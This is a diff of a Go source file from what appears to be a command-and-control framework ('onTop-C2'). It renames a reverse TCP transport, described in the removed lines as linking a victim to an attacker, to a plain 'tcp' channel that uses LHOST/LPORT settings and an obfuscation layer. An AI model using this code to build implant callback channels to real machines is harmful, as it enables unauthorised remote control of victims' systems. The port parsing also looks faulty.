@@ -1,4 +1,3 @@
-// need to change from reverse_tcp for just tcp, reverse is part of spell logic
 package rituals
 
 import (
@@ -9,32 +8,31 @@ import (
 	"strconv"
 	"time"
 
-	// "github.com/Yyax13/onTop-C2/src/misc"
 	"github.com/Yyax13/onTop-C2/src/fidelius"
 	"github.com/Yyax13/onTop-C2/src/types"
 )
 
-var reverse_tcp types.Ritual = types.Ritual{
-	Name: "reverse/tcp",
-	Description: "Create a reverse TCP ritual from inferi (victim) to caster (attacker)",
+var tcp types.Ritual = types.Ritual{
+	Name: "tcp",
+	Description: "Create a TCP ritual",
 	Fidelius: fidelius.Basic_bjump,
-	Init: reverse_tcpInit{},
+	Init: tcpInit{},
 
 }
 
-type reverse_tcpFloo struct{
+type tcpFloo struct{
 	conn net.Conn
 
 }
 
-type reverse_tcpInit struct{
+type tcpInit struct{
 	lhost		string
 	lport		int
 	fidelius	types.FideliusCasting
 
 }
 
-func (r *reverse_tcpFloo) Send(data []byte) (error) {
+func (r *tcpFloo) Send(data []byte) (error) {
 	dataLen := uint64(len(data))
 	dataLenBuf := make([]byte, 8)
 	binary.BigEndian.PutUint64(dataLenBuf, dataLen)
@@ -53,7 +51,7 @@ func (r *reverse_tcpFloo) Send(data []byte) (error) {
 
 }
 
-func (r *reverse_tcpFloo) Receive() ([]byte, error) {
+func (r *tcpFloo) Receive() ([]byte, error) {
 	dataLenBuf := make([]byte, 8)
 	if _, err := io.ReadFull(r.conn, dataLenBuf); err != nil {
 		return nil, fmt.Errorf("receive: failed to receive data len: %w", err)
@@ -72,12 +70,12 @@ func (r *reverse_tcpFloo) Receive() ([]byte, error) {
 
 }
 
-func (r *reverse_tcpFloo) Close() (error) {
+func (r *tcpFloo) Close() (error) {
 	return r.conn.Close()
 
 }
 
-func (r *reverse_tcpFloo) IsActive() (bool) {
+func (r *tcpFloo) IsActive() (bool) {
 	_ = r.conn.SetWriteDeadline(time.Now().Add(time.Millisecond * 900))
 	_, err := r.conn.Write([]byte(nil))
 	r.conn.SetWriteDeadline(time.Time{})
@@ -85,7 +83,7 @@ func (r *reverse_tcpFloo) IsActive() (bool) {
 
 }
 
-func (t reverse_tcpInit) InitArcane() (*types.ArcaneLink, error) {
+func (t tcpInit) InitArcane() (*types.ArcaneLink, error) {
 	host := t.lhost
 	port := t.lport
 	connString := net.JoinHostPort(host, strconv.Itoa(port))
@@ -102,7 +100,7 @@ func (t reverse_tcpInit) InitArcane() (*types.ArcaneLink, error) {
 	}
 
 	return &types.ArcaneLink{
-		Network: &reverse_tcpFloo{
+		Network: &tcpFloo{
 			conn: connection, 
 		
 		},
@@ -113,7 +111,7 @@ func (t reverse_tcpInit) InitArcane() (*types.ArcaneLink, error) {
 
 }
 
-func reverse_tcpCreator() (RitualCreator) {
+func tcpCreator() (RitualCreator) {
 	return func(params map[string]string) (types.RitualInit, error) {
 		port, err := strconv.ParseInt(params["LPORT"], 16, 8)
 		if err != nil {
@@ -127,7 +125,7 @@ func reverse_tcpCreator() (RitualCreator) {
 
 		}
 
-		return reverse_tcpInit{
+		return tcpInit{
 			lhost: params["LHOST"],
 			lport: int(port),
 			fidelius: fideliusCast.Fidelius,
@@ -139,7 +137,7 @@ func reverse_tcpCreator() (RitualCreator) {
 }
 
 func init() {
-	RegisterNewRitual(&reverse_tcp)
-	RegisterNewRitualCreator("reverse/tcp", reverse_tcpCreator())
+	RegisterNewRitual(&tcp)
+	RegisterNewRitualCreator("tcp", tcpCreator())
 
 }
